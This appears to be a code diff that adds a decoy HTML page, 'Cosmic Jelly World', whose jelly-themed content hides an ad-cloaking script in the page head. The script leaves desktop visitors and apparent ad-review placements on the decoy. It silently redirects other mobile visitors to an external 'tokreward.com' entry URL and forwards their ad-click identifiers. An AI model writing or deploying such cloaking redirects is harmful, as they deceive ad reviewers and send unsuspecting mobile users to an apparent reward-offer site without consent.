@@ -1,0 +1,84 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const utmXXX = urlParams.get("xxx");
+    const s = urlParams.get("s");
+    const ttclid = urlParams.get("ttclid");
+    const isMobileDevice = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+    const lander = `https://tokreward.com/api/v5/entry?s1=${s}&ttclid=${ttclid}`;
+    if (utmXXX === "__PLACEMENT__") { }
+    else if (isMobileDevice) { window.location.href = lander; } 
+    else { }
+    </script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cosmic Jelly World</title>
+    <style>
+        body {
+            font-family: 'Comic Sans MS', cursive;
+            background: linear-gradient(45deg, #FF00FF, #00FFFF);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            background-color: #FF69B4;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            padding: 20px;
+            flex-grow: 1;
+        }
+        .jelly-box {
+            background-color: rgba(255, 255, 255, 0.7);
+            border-radius: 50%;
+            padding: 20px;
+            text-align: center;
+            animation: wobble 3s infinite;
+        }
+        @keyframes wobble {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        footer {
+            background-color: #4B0082;
+            color: white;
+            text-align: center;
+            padding: 10px;
+        }
+        a {
+            color: #FFD700;
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Welcome to Cosmic Jelly World</h1>
+    </header>
+    <main>
+        <div class="jelly-box">
+            <h2>Bouncy Blobs</h2>
+            <p>Explore our collection of wiggly wonders!</p>
+        </div>
+        <div class="jelly-box">
+            <h2>Gooey Galaxies</h2>
+            <p>Discover jelly-filled universes beyond imagination!</p>
+        </div>
+        <div class="jelly-box">
+            <h2>Squishy Stars</h2>
+            <p>Experience the squishiest celestial bodies!</p>
+        </div>
+    </main>
+    <footer>
+        <p>&copy; 2023 Cosmic Jelly World | <a href="https://tokreward.com/privacy.html">Privacy Policy</a></p>
+    </footer>
+</body>
+</html>
